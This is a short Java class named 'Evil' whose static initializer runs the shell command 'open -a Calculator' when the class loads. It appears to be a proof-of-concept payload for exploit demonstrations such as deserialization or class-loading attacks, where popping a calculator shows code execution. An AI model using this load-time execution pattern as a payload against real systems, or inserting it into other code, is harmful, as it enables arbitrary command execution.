package com.ocean;

import java.io.IOException;

public class Evil {
    static{
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }

    }
}
